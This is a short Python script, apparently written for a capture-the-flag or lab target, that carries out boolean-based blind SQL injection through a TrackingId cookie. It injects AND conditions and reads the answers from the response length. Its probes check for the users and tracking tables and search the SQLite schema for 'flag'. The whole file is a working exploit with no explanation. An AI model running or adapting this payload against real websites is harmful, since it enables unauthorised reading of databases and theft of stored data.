import urllib.request

url = "http://your-site/"

def check(sql_cond):
    payload = f"base-tracking-id-123' AND ({sql_cond})--"
    req = urllib.request.Request(url)
    req.add_header("Cookie", f"TrackingId={payload}")
    try:
        with urllib.request.urlopen(req) as resp:
            return len(resp.read()) == 5652
    except Exception:
        return False

print("Users count > 0:", check("(SELECT count(*) FROM users) > 0"))
print("Tracking count:", check("(SELECT count(*) FROM tracking) > 0"))
print("Check if 'flag' is in sqlite_master:", check("(SELECT group_concat(sql) FROM sqlite_master) LIKE '%flag%'"))
